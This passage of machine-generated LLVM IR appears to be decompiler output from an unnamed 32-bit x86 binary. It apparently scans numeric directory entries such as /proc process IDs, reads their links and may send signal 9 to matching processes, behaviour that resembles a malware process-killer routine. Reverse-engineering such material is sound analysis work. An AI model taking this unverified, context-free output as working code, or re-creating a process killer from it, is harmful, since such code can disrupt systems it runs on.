dec_label_pc_804d871:                             ; preds = %dec_label_pc_804d859
  %v1_804d871 = add i32 %v0_804d866, 20
  %v2_804d871 = inttoptr i32 %v1_804d871 to i32*
  %v3_804d871 = load i32, i32* %v2_804d871, align 4
  %v1_804d875 = icmp eq i32 %v3_804d871, 0
  %v1_804d877 = icmp eq i1 %v1_804d875, false
  br i1 %v1_804d877, label %dec_label_pc_804db62, label %dec_label_pc_804d87d

dec_label_pc_804d87d:                             ; preds = %dec_label_pc_804d871
  %v1_804d87d = add i32 %v0_804d861, 11
  store i32 %v1_804d87d, i32* @edi, align 4
  %v2_804d880 = inttoptr i32 %v1_804d87d to i8*
  %v3_804d880 = load i8, i8* %v2_804d880, align 1
  %v4_804d880 = zext i8 %v3_804d880 to i32
  %v6_804d880 = and i32 %v0_804d861, -256
  %v7_804d880 = or i32 %v4_804d880, %v6_804d880
  %v1_804d883 = add i32 %v7_804d880, -48
  %v8_804d883 = trunc i32 %v1_804d883 to i8
  store i32 %v1_804d883, i32* %eax.global-to-local, align 4
  %v8_804d888 = icmp ugt i8 %v8_804d883, 9
  br i1 %v8_804d888, label %dec_label_pc_804d859, label %dec_label_pc_804d88a

dec_label_pc_804d88a:                             ; preds = %dec_label_pc_804d87d
  %v2_804d88a = add i32 %v0_804d866, 12
  %v3_804d88a = inttoptr i32 %v2_804d88a to i32*
  store i32 %v1_804d883, i32* %v3_804d88a, align 4
  %v0_804d88b = load i32, i32* %eax.global-to-local, align 4
  %v2_804d88b = add i32 %v0_804d866, 8
  %v3_804d88b = inttoptr i32 %v2_804d88b to i32*
  store i32 %v0_804d88b, i32* %v3_804d88b, align 4
  %v1_804d88c = add i32 %v0_804d866, 4
  %v2_804d88c = inttoptr i32 %v1_804d88c to i32*
  store i32 0, i32* %v2_804d88c, align 4
  %v2_804d88e = inttoptr i32 %v0_804d866 to i32*
  store i32 6, i32* %v2_804d88e, align 4
  %v3_804d890 = call i32 @function_80512a0(i32 0, i32* nonnull @0)
  store i32 %v3_804d890, i32* %eax.global-to-local, align 4
  %v0_804d895 = load i32, i32* @esp, align 4
  %v1_804d895 = inttoptr i32 %v0_804d895 to i32*
  %v3_804d895 = add i32 %v0_804d895, 4
  %v1_804d896 = inttoptr i32 %v3_804d895 to i32*
  store i32 %v3_804d890, i32* %v1_804d896, align 4
  %v1_804d898 = add i32 %v0_804d895, 4139
  store i32 %v1_804d898, i32* %eax.global-to-local, align 4
  store i32 %v1_804d898, i32* %v1_804d895, align 4
  %v3_804d8a0 = call i32 @function_8051cc0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d8a0, i32* %eax.global-to-local, align 4
  %v0_804d8a5 = load i32, i32* @esp, align 4
  %v1_804d8a5 = inttoptr i32 %v0_804d8a5 to i32*
  %v2_804d8a5 = load i32, i32* %v1_804d8a5, align 4
  store i32 %v2_804d8a5, i32* @ebx, align 4
  %v1_804d8a6 = add i32 %v0_804d8a5, 4139
  store i32 %v1_804d8a6, i32* %edx.global-to-local, align 4
  store i32 %v1_804d8a6, i32* %v1_804d8a5, align 4
  %v2_804d8ae = call i32 @function_8051ca0(i8* null)
  store i32 %v2_804d8ae, i32* %eax.global-to-local, align 4
  %v0_804d8b3 = load i32, i32* @esp, align 4
  %v1_804d8b3 = inttoptr i32 %v0_804d8b3 to i32*
  %v2_804d8b3 = load i32, i32* %v1_804d8b3, align 4
  store i32 %v2_804d8b3, i32* %edx.global-to-local, align 4
  %v3_804d8b3 = add i32 %v0_804d8b3, 4
  %v1_804d8b4 = inttoptr i32 %v3_804d8b3 to i32*
  %v0_804d8b5 = load i32, i32* @edi, align 4
  store i32 %v0_804d8b5, i32* %v1_804d8b4, align 4
  %v1_804d8b6 = add i32 %v0_804d8b3, 4139
  store i32 %v1_804d8b6, i32* %edx.global-to-local, align 4
  %v2_804d8bd = add i32 %v1_804d8b6, %v2_804d8ae
  store i32 %v2_804d8bd, i32* %eax.global-to-local, align 4
  store i32 %v2_804d8bd, i32* %v1_804d8b3, align 4
  %v3_804d8c1 = call i32 @function_8051cc0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d8c1, i32* %eax.global-to-local, align 4
  %v0_804d8c6 = load i32, i32* @esp, align 4
  %v1_804d8c6 = inttoptr i32 %v0_804d8c6 to i32*
  %v2_804d8c6 = load i32, i32* %v1_804d8c6, align 4
  store i32 %v2_804d8c6, i32* @ebp, align 4
  %v3_804d8c6 = add i32 %v0_804d8c6, 4
  %v1_804d8c7 = inttoptr i32 %v3_804d8c6 to i32*
  %v2_804d8c7 = load i32, i32* %v1_804d8c7, align 4
  store i32 %v2_804d8c7, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d8c7, align 4
  store i32 7, i32* %v1_804d8c6, align 4
  %v3_804d8cc = call i32 @function_80512a0(i32 0, i32* nonnull @0)
  store i32 %v3_804d8cc, i32* %eax.global-to-local, align 4
  %v0_804d8d1 = load i32, i32* @esp, align 4
  %v1_804d8d1 = inttoptr i32 %v0_804d8d1 to i32*
  %v2_804d8d1 = load i32, i32* %v1_804d8d1, align 4
  store i32 %v2_804d8d1, i32* @esi, align 4
  store i32 %v3_804d8cc, i32* @ebx, align 4
  %v1_804d8d4 = add i32 %v0_804d8d1, 4139
  store i32 %v1_804d8d4, i32* %eax.global-to-local, align 4
  store i32 %v1_804d8d4, i32* %v1_804d8d1, align 4
  %v2_804d8dc = call i32 @function_8051ca0(i8* null)
  store i32 %v2_804d8dc, i32* %eax.global-to-local, align 4
  %v0_804d8e1 = load i32, i32* @esp, align 4
  %v1_804d8e1 = inttoptr i32 %v0_804d8e1 to i32*
  %v2_804d8e1 = load i32, i32* %v1_804d8e1, align 4
  store i32 %v2_804d8e1, i32* %edx.global-to-local, align 4
  %v3_804d8e1 = add i32 %v0_804d8e1, 4
  %v1_804d8e2 = inttoptr i32 %v3_804d8e1 to i32*
  %v0_804d8e3 = load i32, i32* @ebx, align 4
  store i32 %v0_804d8e3, i32* %v1_804d8e2, align 4
  %v1_804d8e4 = add i32 %v0_804d8e1, 4139
  store i32 %v1_804d8e4, i32* %edx.global-to-local, align 4
  %v2_804d8eb = add i32 %v1_804d8e4, %v2_804d8dc
  store i32 %v2_804d8eb, i32* %eax.global-to-local, align 4
  store i32 %v2_804d8eb, i32* %v1_804d8e1, align 4
  %v3_804d8ef = call i32 @function_8051cc0(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804d8f4 = load i32, i32* @esp, align 4
  %v1_804d8f7 = add i32 %v0_804d8f4, 8
  %v2_804d8f7 = inttoptr i32 %v1_804d8f7 to i32*
  store i32 4096, i32* %v2_804d8f7, align 4
  %v1_804d8fc = add i32 %v0_804d8f4, 43
  store i32 %v1_804d8fc, i32* %eax.global-to-local, align 4
  %v2_804d900 = add i32 %v0_804d8f4, 4
  %v3_804d900 = inttoptr i32 %v2_804d900 to i32*
  store i32 %v1_804d8fc, i32* %v3_804d900, align 4
  %v1_804d901 = add i32 %v0_804d8f4, 4139
  store i32 %v1_804d901, i32* %edx.global-to-local, align 4
  %v3_804d908 = inttoptr i32 %v0_804d8f4 to i32*
  store i32 %v1_804d901, i32* %v3_804d908, align 4
  %v4_804d909 = call i32 @function_8052412(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804d90e = load i32, i32* @esp, align 4
  %v1_804d90e = add i32 %v0_804d90e, 16
  %v1_804d911 = add i32 %v4_804d909, 1
  %v8_804d911 = icmp eq i32 %v1_804d911, 0
  store i32 %v1_804d911, i32* %eax.global-to-local, align 4
  br i1 %v8_804d911, label %dec_label_pc_804d859, label %dec_label_pc_804d918

dec_label_pc_804d918:                             ; preds = %dec_label_pc_804d88a
  %v2_804d918 = add i32 %v0_804d90e, 12
  %v3_804d918 = inttoptr i32 %v2_804d918 to i32*
  store i32 %v1_804d911, i32* %v3_804d918, align 4
  %v0_804d919 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d919 = add i32 %v0_804d90e, 8
  %v3_804d919 = inttoptr i32 %v2_804d919 to i32*
  store i32 %v0_804d919, i32* %v3_804d919, align 4
  %v1_804d91a = add i32 %v0_804d90e, 4
  %v2_804d91a = inttoptr i32 %v1_804d91a to i32*
  store i32 0, i32* %v2_804d91a, align 4
  %v2_804d91c = inttoptr i32 %v0_804d90e to i32*
  store i32 6, i32* %v2_804d91c, align 4
  %v3_804d91e = call i32 @function_80512a0(i32 0, i32* nonnull @0)
  store i32 %v3_804d91e, i32* %eax.global-to-local, align 4
  %v0_804d923 = load i32, i32* @esp, align 4
  %v1_804d923 = inttoptr i32 %v0_804d923 to i32*
  %v3_804d923 = add i32 %v0_804d923, 4
  %v1_804d924 = inttoptr i32 %v3_804d923 to i32*
  store i32 %v3_804d91e, i32* %v1_804d924, align 4
  %v1_804d926 = add i32 %v0_804d923, 4139
  store i32 %v1_804d926, i32* %eax.global-to-local, align 4
  store i32 %v1_804d926, i32* %v1_804d923, align 4
  %v3_804d92e = call i32 @function_8051cc0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d92e, i32* %eax.global-to-local, align 4
  %v0_804d933 = load i32, i32* @esp, align 4
  %v1_804d933 = inttoptr i32 %v0_804d933 to i32*
  %v2_804d933 = load i32, i32* %v1_804d933, align 4
  store i32 %v2_804d933, i32* @ebx, align 4
  %v1_804d934 = add i32 %v0_804d933, 4139
  store i32 %v1_804d934, i32* %edx.global-to-local, align 4
  store i32 %v1_804d934, i32* %v1_804d933, align 4
  %v2_804d93c = call i32 @function_8051ca0(i8* null)
  store i32 %v2_804d93c, i32* %eax.global-to-local, align 4
  %v0_804d941 = load i32, i32* @esp, align 4
  %v1_804d941 = inttoptr i32 %v0_804d941 to i32*
  %v2_804d941 = load i32, i32* %v1_804d941, align 4
  store i32 %v2_804d941, i32* %edx.global-to-local, align 4
  %v3_804d941 = add i32 %v0_804d941, 4
  %v1_804d942 = inttoptr i32 %v3_804d941 to i32*
  %v0_804d943 = load i32, i32* @edi, align 4
  store i32 %v0_804d943, i32* %v1_804d942, align 4
  %v1_804d944 = add i32 %v0_804d941, 4139
  store i32 %v1_804d944, i32* %edx.global-to-local, align 4
  %v2_804d94b = add i32 %v1_804d944, %v2_804d93c
  store i32 %v2_804d94b, i32* %eax.global-to-local, align 4
  store i32 %v2_804d94b, i32* %v1_804d941, align 4
  %v3_804d94f = call i32 @function_8051cc0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d94f, i32* %eax.global-to-local, align 4
  %v0_804d954 = load i32, i32* @esp, align 4
  %v1_804d954 = inttoptr i32 %v0_804d954 to i32*
  %v2_804d954 = load i32, i32* %v1_804d954, align 4
  store i32 %v2_804d954, i32* @ebp, align 4
  %v3_804d954 = add i32 %v0_804d954, 4
  %v1_804d955 = inttoptr i32 %v3_804d954 to i32*
  %v2_804d955 = load i32, i32* %v1_804d955, align 4
  store i32 %v2_804d955, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d955, align 4
  store i32 9, i32* %v1_804d954, align 4
  %v3_804d95a = call i32 @function_80512a0(i32 0, i32* nonnull @0)
  store i32 %v3_804d95a, i32* %eax.global-to-local, align 4
  %v0_804d95f = load i32, i32* @esp, align 4
  %v1_804d95f = inttoptr i32 %v0_804d95f to i32*
  %v2_804d95f = load i32, i32* %v1_804d95f, align 4
  store i32 %v2_804d95f, i32* @esi, align 4
  store i32 %v3_804d95a, i32* @ebx, align 4
  %v1_804d962 = add i32 %v0_804d95f, 4139
  store i32 %v1_804d962, i32* %eax.global-to-local, align 4
  store i32 %v1_804d962, i32* %v1_804d95f, align 4
  %v2_804d96a = call i32 @function_8051ca0(i8* null)
  store i32 %v2_804d96a, i32* %eax.global-to-local, align 4
  %v0_804d96f = load i32, i32* @esp, align 4
  %v1_804d96f = inttoptr i32 %v0_804d96f to i32*
  %v2_804d96f = load i32, i32* %v1_804d96f, align 4
  store i32 %v2_804d96f, i32* %edx.global-to-local, align 4
  %v3_804d96f = add i32 %v0_804d96f, 4
  %v1_804d970 = inttoptr i32 %v3_804d96f to i32*
  %v0_804d971 = load i32, i32* @ebx, align 4
  store i32 %v0_804d971, i32* %v1_804d970, align 4
  %v1_804d972 = add i32 %v0_804d96f, 4139
  store i32 %v1_804d972, i32* %edx.global-to-local, align 4
  %v2_804d979 = add i32 %v1_804d972, %v2_804d96a
  store i32 %v2_804d979, i32* %eax.global-to-local, align 4
  store i32 %v2_804d979, i32* %v1_804d96f, align 4
  %v3_804d97d = call i32 @function_8051cc0(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804d982 = load i32, i32* @esp, align 4
  %v1_804d982 = inttoptr i32 %v0_804d982 to i32*
  %v1_804d983 = add i32 %v0_804d982, 4139
  store i32 %v1_804d983, i32* %eax.global-to-local, align 4
  store i32 %v1_804d983, i32* %v1_804d982, align 4
  %v1_804d98b = call i32 @function_8052604(i32 0)
  store i32 %v1_804d98b, i32* %eax.global-to-local, align 4
  %v0_804d990 = load i32, i32* @esp, align 4
  %v1_804d990 = add i32 %v0_804d990, 16
  store i32 %v1_804d98b, i32* @ebp, align 4
  %v1_804d995 = icmp eq i32 %v1_804d98b, 0
  br i1 %v1_804d995, label %dec_label_pc_804d859, label %dec_label_pc_804d99d.preheader

dec_label_pc_804d99d.preheader:                   ; preds = %dec_label_pc_804d918
  %v3_804d9a083 = inttoptr i32 %v0_804d990 to i32*
  store i32 %v1_804d98b, i32* %v3_804d9a083, align 4
  %v0_804d9a184 = call i32 @function_80526f5()
  store i32 %v0_804d9a184, i32* @eax, align 4
  %v0_804d9a685 = load i32, i32* @esp, align 4
  store i32 %v0_804d9a184, i32* @esi, align 4
  %v1_804d9ab87 = icmp eq i32 %v0_804d9a184, 0
  br i1 %v1_804d9ab87, label %dec_label_pc_804dbee, label %dec_label_pc_804d9b3

dec_label_pc_804d9b3:                             ; preds = %dec_label_pc_804d99d.preheader, %dec_label_pc_804d99d.backedge
  %v0_804d9a688 = phi i32 [ %v0_804d9a6, %dec_label_pc_804d99d.backedge ], [ %v0_804d9a685, %dec_label_pc_804d99d.preheader ]
  %v1_804d9b3 = add i32 %v0_804d9a688, 20
  %v2_804d9b3 = inttoptr i32 %v1_804d9b3 to i32*
  %v3_804d9b3 = load i32, i32* %v2_804d9b3, align 4
  store i32 %v3_804d9b3, i32* @eax, align 4
  %v1_804d9b7 = icmp eq i32 %v3_804d9b3, 0
  %v1_804d9b9 = icmp eq i1 %v1_804d9b7, false
  br i1 %v1_804d9b9, label %dec_label_pc_804dbee, label %dec_label_pc_804d9bf

dec_label_pc_804d9bf:                             ; preds = %dec_label_pc_804d9b3
  %v2_804d9bf = add i32 %v0_804d9a688, 12
  %v3_804d9bf = inttoptr i32 %v2_804d9bf to i32*
  store i32 %v3_804d9b3, i32* %v3_804d9bf, align 4
  %v2_804d9c0 = add i32 %v0_804d9a688, 8
  %v3_804d9c0 = inttoptr i32 %v2_804d9c0 to i32*
  store i32 %v3_804d9b3, i32* %v3_804d9c0, align 4
  %v1_804d9c1 = add i32 %v0_804d9a688, 4
  %v2_804d9c1 = inttoptr i32 %v1_804d9c1 to i32*
  store i32 4096, i32* %v2_804d9c1, align 4
  %v1_804d9c6 = add i32 %v0_804d9a688, 43
  store i32 %v1_804d9c6, i32* %edx.global-to-local, align 4
  %v3_804d9ca = inttoptr i32 %v0_804d9a688 to i32*
  store i32 %v1_804d9c6, i32* %v3_804d9ca, align 4
  %v2_804d9cb = call i32 @function_8051d30(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804d9cb, i32* %eax.global-to-local, align 4
  %v0_804d9d0 = load i32, i32* @esp, align 4
  %v1_804d9d0 = inttoptr i32 %v0_804d9d0 to i32*
  %v2_804d9d0 = load i32, i32* %v1_804d9d0, align 4
  store i32 %v2_804d9d0, i32* @ebx, align 4
  %v3_804d9d0 = add i32 %v0_804d9d0, 4
  %v1_804d9d1 = inttoptr i32 %v3_804d9d0 to i32*
  %v2_804d9d1 = load i32, i32* %v1_804d9d1, align 4
  store i32 %v2_804d9d1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d9d1, align 4
  store i32 6, i32* %v1_804d9d0, align 4
  %v3_804d9d6 = call i32 @function_80512a0(i32 0, i32* nonnull @0)
  store i32 %v3_804d9d6, i32* %eax.global-to-local, align 4
  %v0_804d9db = load i32, i32* @esp, align 4
  %v1_804d9db = inttoptr i32 %v0_804d9db to i32*
  %v2_804d9db = load i32, i32* %v1_804d9db, align 4
  store i32 %v2_804d9db, i32* %edx.global-to-local, align 4
  %v3_804d9db = add i32 %v0_804d9db, 4
  %v1_804d9dc = inttoptr i32 %v3_804d9db to i32*
  store i32 %v3_804d9d6, i32* %v1_804d9dc, align 4
  %v1_804d9de = add i32 %v0_804d9db, 4139
  store i32 %v1_804d9de, i32* %eax.global-to-local, align 4
  store i32 %v1_804d9de, i32* %v1_804d9db, align 4
  %v3_804d9e6 = call i32 @function_8051cc0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d9e6, i32* %eax.global-to-local, align 4
  %v0_804d9eb = load i32, i32* @esp, align 4
  %v1_804d9eb = inttoptr i32 %v0_804d9eb to i32*
  %v2_804d9eb = load i32, i32* %v1_804d9eb, align 4
  store i32 %v2_804d9eb, i32* %eax.global-to-local, align 4
  %v1_804d9ec = add i32 %v0_804d9eb, 4139
  store i32 %v1_804d9ec, i32* %edx.global-to-local, align 4
  store i32 %v1_804d9ec, i32* %v1_804d9eb, align 4
  %v2_804d9f4 = call i32 @function_8051ca0(i8* null)
  store i32 %v2_804d9f4, i32* %eax.global-to-local, align 4
  %v0_804d9f9 = load i32, i32* @esp, align 4
  %v1_804d9f9 = inttoptr i32 %v0_804d9f9 to i32*
  %v3_804d9f9 = add i32 %v0_804d9f9, 4
  %v1_804d9fa = inttoptr i32 %v3_804d9f9 to i32*
  %v2_804d9fa = load i32, i32* %v1_804d9fa, align 4
  store i32 %v2_804d9fa, i32* @ebx, align 4
  %v0_804d9fb = load i32, i32* @edi, align 4
  store i32 %v0_804d9fb, i32* %v1_804d9fa, align 4
  %v1_804d9fc = add i32 %v0_804d9f9, 4139
  store i32 %v1_804d9fc, i32* %edx.global-to-local, align 4
  %v2_804da03 = add i32 %v1_804d9fc, %v2_804d9f4
  store i32 %v2_804da03, i32* %eax.global-to-local, align 4
  store i32 %v2_804da03, i32* %v1_804d9f9, align 4
  %v3_804da07 = call i32 @function_8051cc0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804da07, i32* %eax.global-to-local, align 4
  %v0_804da0c = load i32, i32* @esp, align 4
  %v1_804da0c = inttoptr i32 %v0_804da0c to i32*
  %v2_804da0c = load i32, i32* %v1_804da0c, align 4
  store i32 %v2_804da0c, i32* %eax.global-to-local, align 4
  %v3_804da0c = add i32 %v0_804da0c, 4
  %v1_804da0d = inttoptr i32 %v3_804da0c to i32*
  %v2_804da0d = load i32, i32* %v1_804da0d, align 4
  store i32 %v2_804da0d, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_804da0d, align 4
  store i32 9, i32* %v1_804da0c, align 4
  %v3_804da12 = call i32 @function_80512a0(i32 0, i32* nonnull @0)
  store i32 %v3_804da12, i32* @ebx, align 4
  %v0_804da19 = load i32, i32* @esp, align 4
  %v1_804da19 = inttoptr i32 %v0_804da19 to i32*
  %v1_804da1a = add i32 %v0_804da19, 4139
  store i32 %v1_804da1a, i32* %eax.global-to-local, align 4
  store i32 %v1_804da1a, i32* %v1_804da19, align 4
  %v2_804da22 = call i32 @function_8051ca0(i8* null)
  store i32 %v2_804da22, i32* %eax.global-to-local, align 4
  %v0_804da27 = load i32, i32* @esp, align 4
  %v1_804da27 = inttoptr i32 %v0_804da27 to i32*
  %v2_804da27 = load i32, i32* %v1_804da27, align 4
  store i32 %v2_804da27, i32* %edx.global-to-local, align 4
  %v3_804da27 = add i32 %v0_804da27, 4
  %v1_804da28 = inttoptr i32 %v3_804da27 to i32*
  %v0_804da29 = load i32, i32* @ebx, align 4
  store i32 %v0_804da29, i32* %v1_804da28, align 4
  %v1_804da2a = add i32 %v0_804da27, 4139
  store i32 %v1_804da2a, i32* %edx.global-to-local, align 4
  %v2_804da31 = add i32 %v1_804da2a, %v2_804da22
  store i32 %v2_804da31, i32* %eax.global-to-local, align 4
  store i32 %v2_804da31, i32* %v1_804da27, align 4
  %v3_804da35 = call i32 @function_8051cc0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804da35, i32* %eax.global-to-local, align 4
  %v0_804da3a = load i32, i32* @esp, align 4
  %v1_804da3a = inttoptr i32 %v0_804da3a to i32*
  %v2_804da3a = load i32, i32* %v1_804da3a, align 4
  store i32 %v2_804da3a, i32* @ebx, align 4
  %v1_804da3b = add i32 %v0_804da3a, 4139
  store i32 %v1_804da3b, i32* %eax.global-to-local, align 4
  store i32 %v1_804da3b, i32* %v1_804da3a, align 4
  %v2_804da43 = call i32 @function_8051ca0(i8* null)
  store i32 %v2_804da43, i32* %eax.global-to-local, align 4
  %v0_804da48 = load i32, i32* @esp, align 4
  %v1_804da48 = inttoptr i32 %v0_804da48 to i32*
  %v2_804da48 = load i32, i32* %v1_804da48, align 4
  store i32 %v2_804da48, i32* %edx.global-to-local, align 4
  %v3_804da48 = add i32 %v0_804da48, 4
  %v1_804da49 = inttoptr i32 %v3_804da48 to i32*
  store i32 ptrtoint (i32* @global_var_8054b2d.6 to i32), i32* %v1_804da49, align 4
  %v1_804da4f = add i32 %v0_804da48, 4139
  store i32 %v1_804da4f, i32* %edx.global-to-local, align 4
  %v2_804da56 = add i32 %v1_804da4f, %v2_804da43
  store i32 %v2_804da56, i32* %eax.global-to-local, align 4
  store i32 %v2_804da56, i32* %v1_804da48, align 4
  %v3_804da5a = call i32 @function_8051cc0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804da5a, i32* %eax.global-to-local, align 4
  %v0_804da5f = load i32, i32* @esp, align 4
  %v1_804da5f = inttoptr i32 %v0_804da5f to i32*
  %v2_804da5f = load i32, i32* %v1_804da5f, align 4
  store i32 %v2_804da5f, i32* @ebx, align 4
  %v1_804da60 = add i32 %v0_804da5f, 4139
  store i32 %v1_804da60, i32* %eax.global-to-local, align 4
  store i32 %v1_804da60, i32* %v1_804da5f, align 4
  %v2_804da68 = call i32 @function_8051ca0(i8* null)
  store i32 %v2_804da68, i32* %eax.global-to-local, align 4
  %v0_804da6d = load i32, i32* @esp, align 4
  %v1_804da6d = inttoptr i32 %v0_804da6d to i32*
  %v3_804da6d = add i32 %v0_804da6d, 4
  %v0_804da6e = load i32, i32* @esi, align 4
  %v1_804da6e = add i32 %v0_804da6e, 11
  store i32 %v1_804da6e, i32* %edx.global-to-local, align 4
  %v1_804da71 = inttoptr i32 %v3_804da6d to i32*
  store i32 %v1_804da6e, i32* %v1_804da71, align 4
  %v1_804da73 = add i32 %v0_804da6d, 4139
  store i32 %v1_804da73, i32* %edx.global-to-local, align 4
  %v2_804da7a = add i32 %v1_804da73, %v2_804da68
  store i32 %v2_804da7a, i32* %eax.global-to-local, align 4
  store i32 %v2_804da7a, i32* %v1_804da6d, align 4
  %v3_804da7e = call i32 @function_8051cc0(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804da83 = load i32, i32* @esp, align 4
  %v1_804da86 = add i32 %v0_804da83, 8
  %v2_804da86 = inttoptr i32 %v1_804da86 to i32*
  store i32 4096, i32* %v2_804da86, align 4
  %v1_804da8b = add i32 %v0_804da83, 43
  store i32 %v1_804da8b, i32* %eax.global-to-local, align 4
  %v2_804da8f = add i32 %v0_804da83, 4
  %v3_804da8f = inttoptr i32 %v2_804da8f to i32*
  store i32 %v1_804da8b, i32* %v3_804da8f, align 4
  %v1_804da90 = add i32 %v0_804da83, 4139
  store i32 %v1_804da90, i32* %edx.global-to-local, align 4
  %v3_804da97 = inttoptr i32 %v0_804da83 to i32*
  store i32 %v1_804da90, i32* %v3_804da97, align 4
  %v4_804da98 = call i32 @function_8052412(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804da9d = load i32, i32* @esp, align 4
  %v1_804daa0 = add i32 %v4_804da98, 1
  %v8_804daa0 = icmp eq i32 %v1_804daa0, 0
  store i32 %v1_804daa0, i32* %eax.global-to-local, align 4
  br i1 %v8_804daa0, label %dec_label_pc_804d99d.backedge, label %dec_label_pc_804daa7

dec_label_pc_804daa7:                             ; preds = %dec_label_pc_804d9bf
  %v1_804daaa = add i32 %v0_804da9d, 43
  store i32 %v1_804daaa, i32* %eax.global-to-local, align 4
  %v3_804daae = inttoptr i32 %v0_804da9d to i32*
  store i32 %v1_804daaa, i32* %v3_804daae, align 4
  %v2_804daaf = call i32 @function_8051ca0(i8* null)
  %v0_804dab4 = load i32, i32* @esp, align 4
  %v1_804dab7 = add i32 %v0_804dab4, 8764
  store i32 %v1_804dab7, i32* @edx, align 4
  %v2_804dabe = add i32 %v0_804dab4, 8
  %v3_804dabe = inttoptr i32 %v2_804dabe to i32*
  store i32 %v1_804dab7, i32* %v3_804dabe, align 4
  %v2_804dabf = add i32 %v0_804dab4, 4
  %v3_804dabf = inttoptr i32 %v2_804dabf to i32*
  store i32 %v2_804daaf, i32* %v3_804dabf, align 4
  %v1_804dac0 = add i32 %v0_804dab4, 43
  store i32 %v1_804dac0, i32* %eax.global-to-local, align 4
  %v3_804dac4 = inttoptr i32 %v0_804dab4 to i32*
  store i32 %v1_804dac0, i32* %v3_804dac4, align 4
  %v4_804dac5 = call i32 @function_8051f90(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804daca = load i32, i32* @esp, align 4
  %v1_804dacd = add i32 %v4_804dac5, 1
  %v8_804dacd = icmp eq i32 %v1_804dacd, 0
  store i32 %v1_804dacd, i32* %eax.global-to-local, align 4
  br i1 %v8_804dacd, label %dec_label_pc_804d99d.backedge, label %dec_label_pc_804dad4

dec_label_pc_804dad4:                             ; preds = %dec_label_pc_804daa7
  %v0_804dad4 = load i32, i32* @ebx, align 4
  %v2_804dad4 = add i32 %v0_804daca, 12
  %v3_804dad4 = inttoptr i32 %v2_804dad4 to i32*
  store i32 %v0_804dad4, i32* %v3_804dad4, align 4
  %v0_804dad5 = load i32, i32* @ebx, align 4
  %v2_804dad5 = add i32 %v0_804daca, 8
  %v3_804dad5 = inttoptr i32 %v2_804dad5 to i32*
  store i32 %v0_804dad5, i32* %v3_804dad5, align 4
  %v1_804dad6 = add i32 %v0_804daca, 4
  %v2_804dad6 = inttoptr i32 %v1_804dad6 to i32*
  store i32 10, i32* %v2_804dad6, align 4
  %v0_804dad8 = load i32, i32* @edi, align 4
  %v3_804dad8 = inttoptr i32 %v0_804daca to i32*
  store i32 %v0_804dad8, i32* %v3_804dad8, align 4
  %v3_804dad9 = call i32 @function_8051da0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804dad9, i32* %eax.global-to-local, align 4
  %v0_804dade = load i32, i32* @esp, align 4
  %v1_804dade = inttoptr i32 %v0_804dade to i32*
  %v2_804dade = load i32, i32* %v1_804dade, align 4
  store i32 %v2_804dade, i32* %edx.global-to-local, align 4
  %v3_804dade = add i32 %v0_804dade, 4
  %v1_804dadf = inttoptr i32 %v3_804dade to i32*
  store i32 9, i32* %v1_804dadf, align 4
  store i32 %v3_804dad9, i32* %v1_804dade, align 4
  %v4_804dae3 = call i32 @function_8052320(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804dae3, i32* %eax.global-to-local, align 4
  %v0_804dae8 = load i32, i32* @esp, align 4
  %v1_804dae8 = add i32 %v0_804dae8, 20
  %v2_804dae8 = inttoptr i32 %v1_804dae8 to i32*
  store i32 1, i32* %v2_804dae8, align 4
  %v0_804daf0 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d99d.backedge

dec_label_pc_804d99d.backedge:                    ; preds = %dec_label_pc_804dad4, %dec_label_pc_804d9bf, %dec_label_pc_804daa7
  %v0_804d99d42.in = phi i32 [ %v0_804daf0, %dec_label_pc_804dad4 ], [ %v0_804da9d, %dec_label_pc_804d9bf ], [ %v0_804daca, %dec_label_pc_804daa7 ]
  %v0_804d9a0.pre = load i32, i32* @ebp, align 4
  %v3_804d9a0 = inttoptr i32 %v0_804d99d42.in to i32*
  store i32 %v0_804d9a0.pre, i32* %v3_804d9a0, align 4
  %v0_804d9a1 = call i32 @function_80526f5()
  store i32 %v0_804d9a1, i32* @eax, align 4
  %v0_804d9a6 = load i32, i32* @esp, align 4
  store i32 %v0_804d9a1, i32* @esi, align 4
  %v1_804d9ab = icmp eq i32 %v0_804d9a1, 0
  br i1 %v1_804d9ab, label %dec_label_pc_804dbee, label %dec_label_pc_804d9b3

dec_label_pc_804daf8:                             ; preds = %dec_label_pc_804d79b
  %v1_804daf8 = add i32 %v0_804daf8, 1
  store i32 %v1_804daf8, i32* @esi, align 4
  %v9_804daf9 = icmp eq i32 %v0_804daf8, 0
  %v1_804dafc = icmp eq i1 %v9_804daf9, false
  br i1 %v1_804dafc, label %dec_label_pc_804d7a3, label %dec_label_pc_804db02

dec_label_pc_804db02:                             ; preds = %dec_label_pc_804daf8
  %v1_804db02 = add i32 %v0_804d7a5, 3
  %v2_804db02 = inttoptr i32 %v1_804db02 to i8*
  %v3_804db02 = load i8, i8* %v2_804db02, align 1
  %v12_804db02 = icmp eq i8 %v3_804db02, 65
  %.stack_var_-8769.1 = select i1 %v12_804db02, i8 1, i8 %stack_var_-8769.1.ph
